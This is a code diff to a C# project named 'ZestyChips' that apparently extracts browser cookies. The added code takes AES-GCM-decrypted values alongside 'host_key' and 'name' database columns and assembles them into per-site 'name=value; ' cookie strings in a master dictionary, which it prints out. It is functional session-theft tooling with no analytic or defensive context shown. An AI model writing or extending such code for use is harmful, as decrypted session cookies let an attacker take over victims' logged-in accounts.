@@ -6,6 +6,8 @@ using System.Text.Json;
 using System.Security.Cryptography;
 using System.Linq;
 using System.Text;
+using System.Collections.Generic;
+using System.Security.Cryptography.X509Certificates;
 
 namespace ZestyChips
 {
@@ -85,7 +87,29 @@ namespace ZestyChips
                                 try {
                                     aesGcm.Decrypt(nonce, cipherText, tag, decryptedData);
                                     string decryptedString = Encoding.UTF8.GetString(decryptedData);
-                                    Helpers.PrintInfo(decryptedString);
+
+                                    // iterate through each row and store into our masterDictionary
+                                    string key = sdr["host_key"].ToString();
+                                    object value = sdr["name"];
+
+                                    // if the key already exists in masterDictionary, append the new value; if not, add a new key-value pair.
+                                    if (Program.masterDictionary.ContainsKey(key)) {
+                                        Dictionary<string, string> dictionary2 = Program.masterDictionary;
+                                        dictionary2[key] = string.Concat(new string[] {
+                                            dictionary2[key],
+                                            (value != null) ? value.ToString() : null,
+                                            "=",
+                                            decryptedString,
+                                            "; "
+                                        });
+                                    } else {
+                                        Program.masterDictionary.Add(key, ((value != null) ? value.ToString() : null) + "=" + decryptedString + "; ");
+                                    }
+
+                                    foreach (var pair in Program.masterDictionary)
+                                    {
+                                        Helpers.PrintInfo($"Key: {pair.Key}, Value: {pair.Value}");
+                                    }
                                 }
                                 catch (Exception ex) {
                                     Helpers.PrintFail($"failed to decrypt data: {ex}");
